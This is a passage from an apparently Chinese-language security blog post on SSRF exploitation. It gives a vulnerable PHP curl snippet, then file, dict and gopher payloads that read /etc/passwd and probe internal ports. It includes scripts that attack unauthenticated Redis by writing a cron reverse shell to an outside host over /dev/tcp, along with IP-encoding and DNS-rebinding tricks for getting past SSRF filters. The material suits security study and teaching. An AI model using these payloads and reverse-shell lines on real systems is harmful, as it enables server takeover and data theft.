&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;curl_exec()&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
$link = $_GET[&#39;url&#39;];
// 创建一个cURL资源
$ch = curl_init();

// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_HEADER, 0);

// 抓取URL并把它传递给浏览器
curl_exec($ch);

// 关闭cURL资源，并且释放系统资源
curl_close($ch);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;常见利用方式&#34;&gt;常见利用方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;可以对本机、外网、内网其他服务器进行端口扫描并获取一些服务的 banner&lt;/li&gt;
&lt;li&gt;攻击运行在内网或本地的应用程序，如redis、mysql等&lt;/li&gt;
&lt;li&gt;对内网其他web 应用进行指纹识别(一般通过请求一些常见的默认指纹文件实现)&lt;/li&gt;
&lt;li&gt;以当前目标为跳板攻击内外网的 web 应用，一般是使用 get 参数就可以实现的攻击(比如 Struts2 漏洞利用，SQL 注入等)&lt;/li&gt;
&lt;li&gt;利用 file 协议读取本地文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;常用协议&#34;&gt;常用协议&lt;/h2&gt;
&lt;h3 id=&#34;file&#34;&gt;file&lt;/h3&gt;
&lt;p&gt;该协议主要获取本机文件，当有回显时，可用来读取本机敏感文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file:///etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;dict&#34;&gt;dict&lt;/h3&gt;
&lt;p&gt;词典网络协议，通常用于探测内网端口开放情况，但一般只能探测带TCP回显的端口；&lt;/p&gt;
&lt;p&gt;也可用于攻击存在未授权的redis&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dict://x.x.x.x:8080/

dict://x.x.x.x:6379/&amp;lt;Redis 命令&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;gopher&#34;&gt;Gopher&lt;/h3&gt;
&lt;p&gt;gopher 是一个互联网上使用的分布型的文件搜集和获取网络协议，它将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口，支持多个数据包整合发送。&lt;strong&gt;只支持文本，不支持图像&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。 gopher 协议是 ssrf 利用中一个最强大的协议(俗称万能协议)&lt;/p&gt;
&lt;h4 id=&#34;协议格式&#34;&gt;协议格式&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gopher://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;gopher-path&amp;gt;_&amp;lt;TCP数据流&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意不可省略下划线&lt;code&gt;_&lt;/code&gt;，该字符可以替换为任何字符，但一定要存在&lt;/p&gt;
&lt;p&gt;gopher-path可省略&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;为了得到目标服务的TCP数据流，往往需要使用wireshark、socat等工具抓取原始流量&lt;/strong&gt;，再对原始流量进行处理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用gopher发送payload需要进行url编码&lt;/p&gt;
&lt;p&gt;当gopher数据包位于http请求中，可能还需要多次url编码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;gopher协议构造getpost请求&#34;&gt;gopher协议构造GET、POST请求&lt;/h4&gt;
&lt;p&gt;服务端：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
echo &amp;quot;hahaha: &amp;quot;.$_GET[&amp;quot;haha&amp;quot;].&amp;quot;\n&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用bp抓到GET请求包：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /ssrf/test.php?haha=ssrf HTTP/1.1
Host: 192.168.66.55
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;为了构造HTTP协议格式的TCP流，编写转换脚本：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# HTTP协议每行结尾都是&amp;quot;\r\n&amp;quot;


import urllib.parse as urlparse
data = &amp;quot;&amp;quot;&amp;quot;GET /ssrf/test.php?haha=ssrf HTTP/1.1
Host: 192.168.66.55
&amp;quot;&amp;quot;&amp;quot;
ip = &amp;quot;192.168.66.55&amp;quot;
port = 80

encode_data = urlparse.quote(data)
encode_data = encode_data.replace(&#39;%0A&#39;,&#39;%0D%0A&#39;)
result = &#39;gopher://{0}:{1}/&#39;.format(ip, port) + &#39;_&#39; + encode_data
print(result)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;转换结果如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 4385; 
			flex-basis: 10524px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220420070.png&#34; data-size=&#34;1184x27&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220420070.png&#34;
			width=&#34;1184&#34;
			height=&#34;27&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220420070_hu383d941de1d3c885528168609309e9c3_24201_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211219220420070_hu383d941de1d3c885528168609309e9c3_24201_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20211219220420070&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20211219220420070&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发送gopher请求：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 833; 
			flex-basis: 2001px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220805486.png&#34; data-size=&#34;1843x221&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220805486.png&#34;
			width=&#34;1843&#34;
			height=&#34;221&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211219220805486_hu821be4013b84d426abcb7751870d11b0_50404_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211219220805486_hu821be4013b84d426abcb7751870d11b0_50404_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;构造POST请求类似如上，但需要注意POST请求必须包含应有的请求头，即POST、Host、Content-Type和Content-Length(为数据体内容的长度)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
&lt;h4 id=&#34;获取本地信息&#34;&gt;获取本地信息&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 读取敏感文件
file:///etc/passwd

file:///etc/hosts

/proc/net/arp
/etc/network/interfaces
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 探测端口
dict://127.0.0.1:6379/info
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;攻击未授权redis&#34;&gt;攻击未授权Redis&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;有web尝试写webshell&lt;/li&gt;
&lt;li&gt;若支持SSH公钥认证尝试写公钥&lt;/li&gt;
&lt;li&gt;写定时任务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;dict协议&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dict://127.0.0.1:6379/flushall

# 定时任务目录
dict://127.0.0.1:6379/config set dir /var/spool/cron/

# root用户的定时任务文件
dict://127.0.0.1:6379/config set dbfilename root

# 写反弹shell的payload
dict://127.0.0.1:6379/set x &amp;quot;\n* * * * * /bin/bash -i &amp;gt;%26 /dev/tcp/x.x.x.x/7777 0&amp;gt;%261\n&amp;quot;

dict://127.0.0.1:6379/save
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;符号需要url编码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;gopher协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;编写脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; flushall
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;\n\n*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.66.64/8888 0 &amp;gt;&amp;amp;1\n\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; -x &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; haha
redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dir /var/spool/cron
redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; dbfilename root
redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; save
redis-cli -h &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -p &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 socat 模拟抓取原始的 Redis 数据流量：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;socat -v TCP-LISTEN:7777,fork TCP-CONNECT:192.168.66.64:6379
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行脚本：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 478; 
			flex-basis: 1147px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113048545.png&#34; data-size=&#34;899x188&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113048545.png&#34;
			width=&#34;899&#34;
			height=&#34;188&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113048545_hua09dad7b16bcbac134bf784e83f4b1cd_18676_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211226113048545_hua09dad7b16bcbac134bf784e83f4b1cd_18676_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;获取到的中间流量：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 128; 
			flex-basis: 308px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113126018.png&#34; data-size=&#34;1006x782&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113126018.png&#34;
			width=&#34;1006&#34;
			height=&#34;782&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211226113126018_hu57cbc12f2bafb6134f43392144451f28_91385_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211226113126018_hu57cbc12f2bafb6134f43392144451f28_91385_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;流量转换：&lt;/p&gt;
&lt;p&gt;流量抓换的目的是构造符合目标服务的TCP数据流，观察发现抓取到的流量是&lt;code&gt;\r&lt;/code&gt;结尾，而Redis是以CRLF (&lt;code&gt;\r\n&lt;/code&gt;)结尾，所以要进行替换，并进行字符url编码&lt;/p&gt;
&lt;p&gt;转换脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# coding: utf-8&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;readlines&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;lt;+&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 判断倒数第 2、3 字符串是否为 \r&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;# 如果该行只有 \r，将 \r 替换成 %0a%0d%0a&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0a%0d%0a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0d%0a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;# 去掉最后的换行符&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# 判断是否是空行，空行替换为 %0a&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%24&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换后的结果：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1146; 
			flex-basis: 2752px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185517677.png&#34; data-size=&#34;1548x135&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185517677.png&#34;
			width=&#34;1548&#34;
			height=&#34;135&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185517677_hu45259c80a70780429f50887c146c93df_51696_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211227185517677_hu45259c80a70780429f50887c146c93df_51696_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用curl发送gopher协议数据包，可成功执行Redis命令写入计划任务：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 364; 
			flex-basis: 875px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185936894.png&#34; data-size=&#34;1547x424&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185936894.png&#34;
			width=&#34;1547&#34;
			height=&#34;424&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211227185936894_hu4cc1691c2804386476917c654e780589_99874_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211227185936894_hu4cc1691c2804386476917c654e780589_99874_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可使用&lt;strong&gt;Gopherus&lt;/strong&gt;工具&lt;code&gt;https://github.com/tarunkant/Gopherus&lt;/code&gt;，直接生成exp：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 261; 
			flex-basis: 628px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211227191605334.png&#34; data-size=&#34;1973x754&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211227191605334.png&#34;
			width=&#34;1973&#34;
			height=&#34;754&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211227191605334_hu45904ef55333a734c009b2c0a9f2d964_196160_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211227191605334_hu45904ef55333a734c009b2c0a9f2d964_196160_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;攻击未授权mysql&#34;&gt;攻击未授权MySQL&lt;/h4&gt;
&lt;p&gt;当MySQL无需密码认证时可直接发送 TCP/IP 数据包。因此在SSRF漏洞下可直接利用gopher攻击无认证的MySQL。&lt;/p&gt;
&lt;p&gt;tcpdump抓取原始数据包：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# lo 本地回环网卡&lt;/span&gt;
tcpdump -i lo port &lt;span class=&#34;m&#34;&gt;3306&lt;/span&gt; -w mysql.pcapng
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;有待解决？？？ 未利用成功&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过方式&#34;&gt;绕过方式&lt;/h2&gt;
&lt;h3 id=&#34;ip&#34;&gt;IP&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;短网址302跳转&lt;/li&gt;
&lt;li&gt;域名解析到内网，例如&lt;strong&gt;127.0.0.1.xip.io &amp;gt; 127.0.0.1&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;改写IP
&lt;ul&gt;
&lt;li&gt;192.168.1.1&lt;/li&gt;
&lt;li&gt;八进制：0300.0250.1.1&lt;/li&gt;
&lt;li&gt;十六进制：0xC0.0xA8.1.1&lt;/li&gt;
&lt;li&gt;十进制整数格式(C0A80101的十进制数)：3232235777&lt;/li&gt;
&lt;li&gt;十六进制数格式：0xC0A80101&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;@：&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.baidu.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.baidu.com&lt;/a&gt;@192.168.1.1/ &amp;gt; http://192.168.1.1&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-重绑定&#34;&gt;DNS 重绑定&lt;/h3&gt;
&lt;h4 id=&#34;原理-1&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;常见的针对SSRF的修复方案如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 108; 
			flex-basis: 259px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211228201857858.png&#34; data-size=&#34;1282x1187&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211228201857858.png&#34;
			width=&#34;1282&#34;
			height=&#34;1187&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211228201857858_hu37f67c7fa47eb6cbcbc857334992fdfe_268106_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211228201857858_hu37f67c7fa47eb6cbcbc857334992fdfe_268106_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;即：先对url中的host进行DNS解析，根据解析到的IP进行白名单判断，不在白名单范围就拒绝请求，在范围内服务端就请求该url。当服务端进行url请求时会进行第二次DNS解析，然而两次DNS解析明显存在时间差，可利用时间差绕过。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DNS中TTL&lt;/strong&gt;指的是域名和IP绑定关系的Cache在DNS上存活的最长时间，在这个时间内当域名到达后且缓存里有该域名记录，则直接返回缓存好的结果，如果超过TTL则丢弃缓存，当域名到达后就会重新向上层域名服务器请求解析，再重新建立缓存。&lt;/p&gt;
